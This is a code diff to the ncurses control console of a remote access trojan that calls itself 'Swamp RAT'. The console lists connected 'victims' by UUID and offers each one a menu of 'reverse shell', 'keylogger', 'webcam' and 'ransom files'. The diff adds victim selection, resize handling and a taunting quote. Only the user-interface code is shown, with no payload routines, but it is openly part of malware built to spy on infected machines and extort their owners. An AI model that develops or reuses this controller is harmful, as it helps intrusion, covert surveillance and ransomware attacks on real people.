@@ -19,6 +19,10 @@
 #define _GNU_SOURCE
 #endif
 
+#ifndef KEY_ESC
+#define KEY_ESC 27
+#endif
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -81,7 +85,7 @@ bool ncurses_wmenu(WINDOW *win_main,
   box(win_menu, 0, 0);
   mvwprintw(win_menu,
             1,
-            (x / 2) - strlen(win_menu_title),
+            (x / 2) - (strlen(win_menu_title) / 2),
             "%s",
             win_menu_title);
   mvwaddch(win_menu, 2, 0, ACS_LTEE);
@@ -106,83 +110,7 @@ bool ncurses_menu_free(MENU *menu, ITEM **items, int n_items){
   return true;
 }
 
-#ifndef NCF_OPTS
-#define NCF_OPTS_SHELL  1
-#define NCF_OPTS_KEYLOG 2
-#define NCF_OPTS_WEBCAM 3
-#define NCF_OPTS_RANSOM 4
-#define NCF_OPTS_BACK   5
-#define NCF_OPTS
-#endif
 
-int ncurses_wcmd_select(WINDOW *win_main, WINDOW *win_menu, char *uuid){
-  MENU *menu;
-  int n_choices, key;
-  ITEM **item_options;
-  char *options[] = {
-    "reverse shell",
-    "keylogger",
-    "webcam",
-    "ransom files",
-    "back",
-  };
-  int x, y;
-  n_choices = ARRAY_SIZE(options);
-  item_options = (ITEM **)calloc(n_choices + 1, sizeof(ITEM *));
-  for(int i = 0; i < n_choices; ++i){
-    item_options[i] = new_item(itoa(i+1), options[i]);
-  }
-  item_options[n_choices] = (ITEM *)NULL;
-  menu = new_menu((ITEM **)item_options);
-  getmaxyx(win_main, y, x);
-  wresize(win_menu,
-          (y - y_margin),
-          (x - x_margin));
-  keypad(win_menu, TRUE);
-  wclear(win_menu);
-  set_menu_win(menu, win_menu);
-  set_menu_sub(menu,
-               derwin(win_menu,
-                      y - (y_margin * 2),
-                      x - (x_margin * 2),
-                      3,
-                      1)
-               );
-  set_menu_mark(menu, " -> ");
-  set_menu_format(menu,
-                  (y - (y_margin * 2)),
-                  1);
-  ncurses_wmenu(win_main, win_menu, uuid);
-  post_menu(menu);
-  wrefresh(win_menu);
-  while (true){
-    key = wgetch(win_menu);
-    if (key == KEY_DOWN){
-      menu_driver(menu, REQ_DOWN_ITEM);
-    }
-    if (key == KEY_UP){
-      menu_driver(menu, REQ_UP_ITEM);
-    }
-    if (key == KEY_NPAGE){
-      menu_driver(menu, REQ_SCR_DPAGE);
-    }
-    if (key == KEY_PPAGE){
-      menu_driver(menu, REQ_SCR_UPAGE);
-    }
-    if (key == KEY_LEFT){
-      break;
-    }
-    if (key == 10 || key == KEY_ENTER || key == KEY_RIGHT){
-      ITEM *item_selected;
-      item_selected = current_item(menu);
-      int option = atoi(item_name(item_selected));
-      ncurses_menu_free(menu, item_options, n_choices);
-      return option;
-    }
-  }
-  ncurses_menu_free(menu, item_options, n_choices);
-  return -1;
-}
 
 ITEM **ncurses_item_victims_create(){
   /*
@@ -251,7 +179,7 @@ MENU *ncurses_wmenu_update(WINDOW *win_main,
       i_items++;
     }
   }
-  ncurses_wmenu(win_main, win_menu, "Victims");
+  ncurses_wmenu(win_main, win_menu, "Swamp");
   menu = new_menu(items);
   set_menu_win(menu, win_menu);
   set_menu_sub(menu, derwin(win_menu,
@@ -311,6 +239,7 @@ bool ncurses_wmain_update(WINDOW *win_main){
   char win_main_title[] = "|Swamp RAT|";
   char win_main_footer[] = "|lillypad|";
   char win_main_logo[] = "~~(__`*>";
+  char win_main_quote[] = "Fat3 cr33p5 l!k3 a r@t. - Elizabeth Bowen";
   getmaxyx(win_main, y, x);
   wresize(win_main, y, x);
   box(win_main, 0, 0);
@@ -336,9 +265,115 @@ bool ncurses_wmain_update(WINDOW *win_main){
             1,
             (x - 1) - strlen(win_main_logo),
             win_main_logo);
+  mvwprintw(win_main,
+            y - 2,
+            (x - strlen(win_main_quote) - 1),
+            win_main_quote);
   pthread_mutex_unlock(&NCURSES_PTHREAD_MUTEX);
   return true;
 }
+
+#ifndef NCF_OPTS
+#define NCF_OPTS_SHELL  1
+#define NCF_OPTS_KEYLOG 2
+#define NCF_OPTS_WEBCAM 3
+#define NCF_OPTS_RANSOM 4
+#define NCF_OPTS_BACK   5
+#define NCF_OPTS
+#endif
+
+int ncurses_wcmd_select(WINDOW *win_main, WINDOW *win_menu, char *uuid){
+  MENU *menu;
+  int n_choices, key;
+  ITEM **item_options;
+  char *options[] = {
+    "reverse shell",
+    "keylogger",
+    "webcam",
+    "ransom files",
+    "back",
+  };
+  int x, y;
+  n_choices = ARRAY_SIZE(options);
+  item_options = (ITEM **)calloc(n_choices + 1, sizeof(ITEM *));
+  for(int i = 0; i < n_choices; ++i){
+    item_options[i] = new_item(itoa(i+1), options[i]);
+  }
+  item_options[n_choices] = (ITEM *)NULL;
+  menu = new_menu((ITEM **)item_options);
+  getmaxyx(win_main, y, x);
+  wresize(win_menu,
+          (y - y_margin),
+          (x - x_margin));
+  keypad(win_menu, TRUE);
+  wclear(win_menu);
+  set_menu_win(menu, win_menu);
+  set_menu_sub(menu,
+               derwin(win_menu,
+                      y - (y_margin * 2),
+                      x - (x_margin * 2),
+                      3,
+                      1)
+               );
+  set_menu_mark(menu, " -> ");
+  set_menu_format(menu,
+                  (y - (y_margin * 2)),
+                  1);
+  ncurses_wmenu(win_main, win_menu, uuid);
+  post_menu(menu);
+  wrefresh(win_menu);
+  while (true){
+    key = wgetch(win_menu);
+    if (key == KEY_RESIZE){
+      wclear(win_main);
+      wclear(win_menu);
+      ncurses_wmain_update(win_main);
+      getmaxyx(win_main, y, x);
+      set_menu_win(menu, win_menu);
+      set_menu_sub(menu,
+                   derwin(win_menu,
+                          y - (y_margin * 2),
+                          x - (x_margin * 2),
+                          3,
+                          1)
+                   );
+      set_menu_mark(menu, " -> ");
+      set_menu_format(menu,
+                      (y - (y_margin * 2)),
+                      1);
+      ncurses_wmenu(win_main, win_menu, uuid);
+      post_menu(menu);
+      wrefresh(win_main);
+      wrefresh(win_menu);
+    }
+    if (key == KEY_DOWN){
+      menu_driver(menu, REQ_DOWN_ITEM);
+    }
+    if (key == KEY_UP){
+      menu_driver(menu, REQ_UP_ITEM);
+    }
+    if (key == KEY_NPAGE){
+      menu_driver(menu, REQ_SCR_DPAGE);
+    }
+    if (key == KEY_PPAGE){
+      menu_driver(menu, REQ_SCR_UPAGE);
+    }
+    if (key == KEY_LEFT){
+      break;
+    }
+    if (key == 10 || key == KEY_ENTER || key == KEY_RIGHT){
+      ITEM *item_selected;
+      item_selected = current_item(menu);
+      int option = atoi(item_name(item_selected));
+      ncurses_menu_free(menu, item_options, n_choices);
+      return option;
+    }
+  }
+  ncurses_menu_free(menu, item_options, n_choices);
+  return -1;
+}
+
+bool NCURSES_PTHREAD_WMAIN_UPDATE_SUSPEND = false;
 
 typedef struct{
   WINDOW *win_main;
@@ -356,25 +391,27 @@ void *ncurses_pthread_wmain_update(void *args){
   */
   ncurses_pthread_wmain_update_args_t *p_args = args;
   while (true){
-    wclear(p_args->win_main);
-    wclear(p_args->win_menu);
-    ncurses_wmain_update(p_args->win_main);
-    p_args->p_menu_victims = ncurses_wmenu_update(p_args->win_main,
-                                                  p_args->win_menu,
-                                                  p_args->p_item_victims,
-                                                  p_args->p_victims);
-    if (NET_VICTIMS_TOTAL != 0){
-      if (NCURSES_WMENU_POS > (NET_VICTIMS_TOTAL - 1)){
-        NCURSES_WMENU_POS = NET_VICTIMS_TOTAL - 1;
-        set_current_item(p_args->p_menu_victims,
-                         p_args->p_item_victims[NCURSES_WMENU_POS]);
-      } else {
-        set_current_item(p_args->p_menu_victims,
-                         p_args->p_item_victims[NCURSES_WMENU_POS]);
+    if (NCURSES_PTHREAD_WMAIN_UPDATE_SUSPEND == false){
+      wclear(p_args->win_main);
+      wclear(p_args->win_menu);
+      ncurses_wmain_update(p_args->win_main);
+      p_args->p_menu_victims = ncurses_wmenu_update(p_args->win_main,
+                                                    p_args->win_menu,
+                                                    p_args->p_item_victims,
+                                                    p_args->p_victims);
+      if (NET_VICTIMS_TOTAL != 0){
+        if (NCURSES_WMENU_POS > (NET_VICTIMS_TOTAL - 1)){
+          NCURSES_WMENU_POS = NET_VICTIMS_TOTAL - 1;
+          set_current_item(p_args->p_menu_victims,
+                           p_args->p_item_victims[NCURSES_WMENU_POS]);
+        } else {
+          set_current_item(p_args->p_menu_victims,
+                           p_args->p_item_victims[NCURSES_WMENU_POS]);
+        }
       }
+      wrefresh(p_args->win_main);
+      wrefresh(p_args->win_menu);
     } 
-    wrefresh(p_args->win_main);
-    wrefresh(p_args->win_menu);
     sleep(1);
   }
   free(args);
@@ -440,7 +477,8 @@ bool ncurses_main(int port){
                                             win_menu,
                                             p_item_victims,
                                             p_victims);
-      set_current_item(p_menu_victims, p_item_victims[NCURSES_WMENU_POS + 1]);
+      set_current_item(p_menu_victims,
+                       p_item_victims[NCURSES_WMENU_POS + 1]);
       NCURSES_WMENU_POS = NCURSES_WMENU_POS + 1;
       wrefresh(win_menu);
     }
@@ -449,19 +487,46 @@ bool ncurses_main(int port){
                                             win_menu,
                                             p_item_victims,
                                             p_victims);
-      set_current_item(p_menu_victims, p_item_victims[NCURSES_WMENU_POS - 1]);
+      set_current_item(p_menu_victims,
+                       p_item_victims[NCURSES_WMENU_POS - 1]);
       NCURSES_WMENU_POS = NCURSES_WMENU_POS - 1;
       wrefresh(win_menu);
     }
-    if (key == 10 || key == KEY_ENTER){
-      continue;
+    if (key == KEY_ESC || key == KEY_LEFT){
+      break;
+    }
+    if ((key == 10 || key == KEY_ENTER || key == KEY_RIGHT) && NET_VICTIMS_TOTAL > 0){
+      NCURSES_PTHREAD_WMAIN_UPDATE_SUSPEND = true;
+      ITEM *item;
+      char uuid[SYS_UUID_SIZE];
+      if (NET_VICTIMS_TOTAL == 1){
+        p_menu_victims = ncurses_wmenu_update(win_main,
+                                              win_menu,
+                                              p_item_victims,
+                                              p_victims);
+      }
+      item = current_item(p_menu_victims);
+      strncpy(uuid, item_name(item), SYS_UUID_SIZE);
+      ncurses_wcmd_select(win_main, win_menu, uuid);
+      wclear(win_main);
+      wclear(win_menu);
+      ncurses_wmain_update(win_main);
+      p_menu_victims = ncurses_wmenu_update(win_main,
+                                            win_menu,
+                                            p_item_victims,
+                                            p_victims);
+      set_current_item(p_menu_victims, p_item_victims[NCURSES_WMENU_POS]);
+      wrefresh(win_main);
+      wrefresh(win_menu);
+      NCURSES_PTHREAD_WMAIN_UPDATE_SUSPEND = false;
     }
   }
+  endwin();
+  printf("leaving the swamp!\n");
   ncurses_menu_free(p_menu_victims,
                     p_item_victims,
                     NET_MAX_CLIENTS);
   net_cleanup_victims(p_victims);
   net_cleanup_commands(p_commands);
-  endwin();
   return true;
 }
